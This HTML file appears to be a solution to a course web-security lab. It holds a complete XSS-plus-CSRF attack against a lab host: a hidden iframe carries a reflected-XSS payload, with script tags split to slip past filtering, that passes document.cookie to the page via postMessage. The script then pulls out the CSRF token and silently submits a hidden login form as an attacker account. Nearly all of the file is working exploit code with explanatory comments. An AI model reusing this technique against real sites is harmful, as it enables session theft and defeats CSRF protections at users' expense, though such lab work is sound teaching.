<!DOCTYPE html>
<html lang="en">
<!--learning resources: https://owasp.org/www-community/attacks/csrf, https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage-->
<body>
  <!-- iframe to steal cookies -->
  <iframe id="tokenFrame" style="display:none" aria-hidden="true"></iframe>
  <!-- iframe to submit login form -->
  <iframe name="hiddenFrame" style="display:none" aria-hidden="true"></iframe>

  <!-- send the output of the form to the hidden iframe so the user doesn't see it -->
  <form id="loginForm" method="post" action="http://cpsc4200.mpese.com/login?csrfdefense=1&xssdefense=0"
    target="hiddenFrame" style="display:none">
    <input name="username" type="hidden" value="attacker">
    <input name="password" type="hidden" value="l33th4x">
    <input id="csrf_token" name="csrf_token" type="hidden" value="">
  </form>

  <script>
    // listen for messages from the iframe
    function messageHandler(event) {
      // payload sends either a string or an object {cookie: '...'}
      var cookie = '';
      if (event.data && event.data.cookie) {
        cookie = event.data.cookie;
      } else cookie = event.data;

      // get csrf_token from the cookie
      var match = cookie.match(/(?:^|;\s*)csrf_token=([^;]+)/);
      // make sure the token exists
      if (!match) return;
      // decode the token
      var token = decodeURIComponent(match[1]);

      // get the login form
      var loginForm = document.getElementById('loginForm');
      // set the csrf_token field
      loginForm.csrf_token.value = token;
      // submit the form
      loginForm.submit();
    }

    // Add a listener for messages from the iframe
    window.addEventListener('message', messageHandler, false);

    // create and load the payload iframe
    (function () {
      const baseURL = 'http://cpsc4200.mpese.com/search?xssdefense=0&q=';
      // can't use script tags directly in the payload, so break them up
      // this payload steals document.cookie and sends it to the parent window at location null (because of same-origin policy)
      const payload = '<scr' + 'ipt>parent.postMessage({cookie: document.cookie}, "*");</scr' + 'ipt>';
      encoded_payload = encodeURIComponent(payload);
      // set the iframe src to the payload URL so it executes in the correct domain
      tokenFrame = document.getElementById('tokenFrame');
      tokenFrame.src = baseURL + encoded_payload;
    })();
  </script>
</body>
</html>